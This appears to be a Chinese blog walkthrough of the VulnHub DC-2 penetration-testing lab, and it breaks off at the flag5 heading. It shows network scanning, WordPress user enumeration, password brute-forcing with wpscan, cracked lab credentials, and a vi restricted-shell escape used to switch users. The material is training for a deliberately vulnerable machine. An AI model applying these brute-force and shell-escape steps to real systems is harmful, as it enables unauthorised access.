@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DC-2靶场记录">
+<title>DC-2</title>
+
+<link rel='canonical' href='https://dxlaboratory.github.io/p/test2-chinese/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="DC-2">
+<meta property='og:description' content="DC-2靶场记录">
+<meta property='og:url' content='https://dxlaboratory.github.io/p/test2-chinese/'>
+<meta property='og:site_name' content='鼎新安全'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-10-31T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2024-10-31T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="DC-2">
+<meta name="twitter:description" content="DC-2靶场记录">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu15989093696106354798.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">👻</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">鼎新安全</a></h1>
+            <h2 class="site-description">欢迎来到鼎新实验室</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/DXlaboratory/dxlaboratory.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://dxlaboratory.github.io/en/" >English</option>
+                                
+                                    <option value="https://dxlaboratory.github.io/" selected>简体中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#下载链接">下载链接：</a></li>
+    <li><a href="#vmware环境配置">VMware环境配置</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#一信息收集">一、信息收集</a></li>
+    <li><a href="#flag1">flag1</a></li>
+    <li><a href="#二渗透阶段">二、渗透阶段</a></li>
+    <li><a href="#flag2">flag2</a></li>
+    <li><a href="#flag3">flag3</a></li>
+    <li><a href="#flag4">flag4</a></li>
+    <li><a href="#flag5">flag5</a></li>
+    <li><a href="#三提权">三、提权</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E9%9D%B6%E5%9C%BA/" >
+                靶场
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/test2-chinese/">DC-2</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            DC-2靶场记录
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 31, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 3 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="前言">前言
+</h1><hr>
+<blockquote>
+<p>与 DC-1 非常相似，DC-2 是另一个专门建造的易受攻击实验室，目的是获得渗透测试领域的经验。
+与最初的 DC-1 一样，它的设计考虑到了初学者。
+必须具备 Linux 技能和熟悉 Linux 命令行，以及具备一些基本渗透测试工具的经验。
+就像 DC-1 一样，有五个标志，包括最后一个标志。
+再说一次，就像 DC-1 一样，这些标志对初学者很重要，但对有经验的人来说并不那么重要。
+简而言之，唯一真正重要的标志是最后一面旗帜。
+对于初学者来说，Google 是您的朋友。嗯，除了所有的隐私问题等。
+我还没有探索实现 root 的所有方法，因为我放弃了我一直在努力的上一个版本，除了基本操作系统安装之外，我完全从头开始。</p>
+</blockquote>
+<p>[TOC]</p>
+<h1 id="实验环境">实验环境：
+</h1><h2 id="下载链接">下载链接：
+</h2><p><a class="link" href="https://www.vulnhub.com/entry/dc-1,292/"  target="_blank" rel="noopener"
+    >https://www.vulnhub.com/entry/dc-1,292/</a><br>
+（下载慢，放到迅雷里面）</p>
+<h2 id="vmware环境配置">VMware环境配置
+</h2><p>必须是NAT模式，且攻击机也是NAT模式</p>
+<p><img src="/p/test2-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47.png"
+	width="1105"
+	height="271"
+	srcset="/p/test2-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu15866109228737243187.png 480w, /p/test2-chinese/index.zh-cn.assets/1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47_hu6299938560519909588.png 1024w"
+	loading="lazy"
+	
+		alt="1730085063602-21a082af-33bb-4b19-b5b0-ae96bebccc47"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="407"
+		data-flex-basis="978px"
+	
+></p>
+<h1 id="攻击步骤">攻击步骤
+</h1><h2 id="一信息收集">一、信息收集
+</h2><p>查看自己的IP地址，使用nmap进行同网段扫描</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ifconfig
+</span></span><span class="line"><span class="cl">ip:192.168.26.128
+</span></span><span class="line"><span class="cl">nmap -sP 192.168.26.128/24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>目标IP：192.168.26.129</p>
+<p>扫描该IP端口及服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nmap -p- -sV 192.168.26.129
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结果</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 23:26 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report for 192.168.26.129
+</span></span><span class="line"><span class="cl">Host is up (0.00062s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65533 closed tcp ports (reset)
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
+</span></span><span class="line"><span class="cl">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
+</span></span><span class="line"><span class="cl">MAC Address: 00:0C:29:F4:BE:15 (VMware)
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>一个http的80端口，一个7744的ssh服务</p>
+<p>如果访问打不开网站的话，说明网站被重定向了</p>
+<p>添加一下主机就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vim /etc/hosts
+</span></span><span class="line"><span class="cl">192.168.26.129 dc-2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="flag1">flag1
+</h2><p>打开页面发现flag标志</p>
+<p><img src="/p/test2-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0.png"
+	width="994"
+	height="574"
+	srcset="/p/test2-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu14232903875567318267.png 480w, /p/test2-chinese/index.zh-cn.assets/1730092430136-e3c4d268-b813-45cb-8f8e-f59565614be0_hu7079742860394796661.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="415px"
+	
+></p>
+<p>意思：</p>
+<p>让我们找会员的登录密码，登录一个人后给下一个flag</p>
+<h2 id="二渗透阶段">二、渗透阶段
+</h2><h2 id="flag2">flag2
+</h2><p>cewl介绍:</p>
+<p>是一个用于生成自定义字典文件的工具，通常用于渗透测试和密码破解。它通过爬取目标网站，提取其中的单词、短语和其他文本信息，以便生成一个用于攻击的字典文件。</p>
+<p>扒一下网站，看看有什么</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cewl http://dc-2 -w passwd.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/test2-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3.png"
+	width="348"
+	height="577"
+	srcset="/p/test2-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu9462413550411062395.png 480w, /p/test2-chinese/index.zh-cn.assets/1730093071241-071746f0-0615-4335-9876-010c963639e3_hu16018118924427410528.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="60"
+		data-flex-basis="144px"
+	
+></p>
+<p>再扫描一下目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">dirb http://dc-2 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/test2-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde.png"
+	width="607"
+	height="177"
+	srcset="/p/test2-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu9665311826050100085.png 480w, /p/test2-chinese/index.zh-cn.assets/1730093601145-d19f15c5-fdc2-401e-87dd-9079e2f6cdde_hu2292211963539219201.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="342"
+		data-flex-basis="823px"
+	
+></p>
+<p>扫描到登录界面</p>
+<p><img src="/p/test2-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5.png"
+	width="532"
+	height="480"
+	srcset="/p/test2-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu15474374288307030387.png 480w, /p/test2-chinese/index.zh-cn.assets/1730093661658-c232badc-2e2a-4823-9a46-691f1b1855e5_hu2709866776154881619.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="110"
+		data-flex-basis="266px"
+	
+></p>
+<p>有密码了，现在只要枚举一下用户名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wpscan --url http://dc-2/ -e u      //枚举用户名字
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>枚举出来的用户名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin
+</span></span><span class="line"><span class="cl">tom
+</span></span><span class="line"><span class="cl">jerry
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后创建一个user.txt文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">touch user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;admin&#34; &gt;&gt; user.txt
+</span></span><span class="line"><span class="cl">echo &#34;tom&#34; &gt;&gt; user.txt
+</span></span><span class="line"><span class="cl">echo &#34;jerry&#34; &gt;&gt; user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>爆破登录框</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wpscan --url http://dc-2/ -U user.txt -P passwd.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到用户和密码进行登录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[!] Valid Combinations Found:                                                                                                           
+</span></span><span class="line"><span class="cl">Username: jerry, Password: adipiscing
+</span></span><span class="line"><span class="cl">Username: tom, Password: parturient
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>到处点一点拿到flag2</p>
+<p><img src="/p/test2-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4.png"
+	width="852"
+	height="336"
+	srcset="/p/test2-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu18027516157568359795.png 480w, /p/test2-chinese/index.zh-cn.assets/1730094635282-25fd07ef-c4d2-4f92-aca5-ad8b7e156fa4_hu3052568483070104277.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="608px"
+	
+></p>
+<p>意思：</p>
+<p>如果你不能利用WordPress并走捷径，还有另一种方法。</p>
+<p>希望你找到了另一个切入点。</p>
+<h2 id="flag3">flag3
+</h2><p>前面有一个7744端口的ssh远程连接服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh tom@192.168.26.129 -p 7744 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进行连接登录</p>
+<p><img src="/p/test2-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6.png"
+	width="720"
+	height="190"
+	srcset="/p/test2-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu7677809838715028512.png 480w, /p/test2-chinese/index.zh-cn.assets/1730097632723-ab47096f-b49b-493e-9723-8c80094145c6_hu4811569570229345252.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="378"
+		data-flex-basis="909px"
+	
+></p>
+<p>ls-l查看文件目录，有一个flag3.txt</p>
+<p>cat 查看该文件发现权限不足</p>
+<p>查看可用的命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">compgen -c       //查看可以使用的指令
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">less
+</span></span><span class="line"><span class="cl">scp
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">vi
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现有个vi,用这个命令打开该文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vi flag3.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到flag3</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>意思：</p>
+<p>可怜的老汤姆总是追着杰瑞跑。也许他应该为他造成的所有压力感到自豪。</p>
+<h2 id="flag4">flag4
+</h2><p>提示：大概意思就是提权</p>
+<p>打开一个文件，用vi去编辑，然后提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">vi flag3.txt
+</span></span><span class="line"><span class="cl">:set shell=/bin/sh
+</span></span><span class="line"><span class="cl">:shell
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">su
+</span></span><span class="line"><span class="cl">cd ..
+</span></span><span class="line"><span class="cl">ls -l
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>该目录下有 tom和jerry</p>
+<p>到jerry用户下面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd jerry
+</span></span><span class="line"><span class="cl">vi flag4.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag4.txt</p>
+<blockquote>
+<p>ood to see that you&rsquo;ve made it this far - but you&rsquo;re not home yet.
+You still need to get the final flag (the only flag that really counts!!!).
+No hints here - you&rsquo;re on your own now. :-)
+Go on - git outta here!!!!</p>
+</blockquote>
+<h2 id="flag5">flag5
